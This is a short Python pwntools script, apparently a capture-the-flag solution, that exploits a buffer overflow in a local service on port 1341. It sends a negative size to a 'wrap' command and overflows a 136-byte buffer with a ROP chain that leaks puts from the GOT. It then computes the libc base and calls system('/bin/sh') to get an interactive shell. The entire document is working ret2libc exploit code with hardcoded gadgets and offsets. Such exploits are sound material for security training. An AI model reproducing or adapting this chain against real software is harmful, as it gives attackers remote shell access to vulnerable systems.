from pwn import *

r = remote('127.0.0.1', 1341)
pop_rdi = 0x0040154a
puts_got = 0x602018
call_puts = 0x00401229

rop = p64(pop_rdi)
rop += p64(puts_got)
rop += p64(call_puts)

payload = "A" * 136  # fill the buffer
payload += rop       # Append our rop chain

r.sendlineafter("> ", "wrap")  # Send the wrap command
r.sendlineafter("|> ", "-1")  # set the size to -1
r.sendlineafter("|> ", payload)  # send the payload

# Get the last sent line, this contains raw data read from *puts_got
r.recvuntil("Wow! This looks so beautiful\n")  # recv the data
data = r.recvline().strip()
print(repr(data)) # print raw data so we can verify

# Pad the address to 8 bytes so we can unpack it
pad = "\x00" * (8 - len(data))
addr = data + pad

# Unpack the addr
puts_absolute = u64(addr)
print "puts is at", hex(puts_absolute)

r = remote('127.0.0.1', 1341)

libc_base = puts_absolute - 0x78460

system_absolute = libc_base + 0x47dc0
bin_sh_absolute = libc_base + 0x1a3ee0

rop = p64(pop_rdi)
rop += p64(bin_sh_absolute)
rop += p64(system_absolute)

payload = "A" * 136  # fill the buffer
payload += rop       # Append our rop chain

r.sendlineafter("> ", "wrap")  # Send the wrap command
r.sendlineafter("|> ", "-1")  # set the size to -1
r.sendlineafter("|> ", payload)  # send the payload
r.interactive()
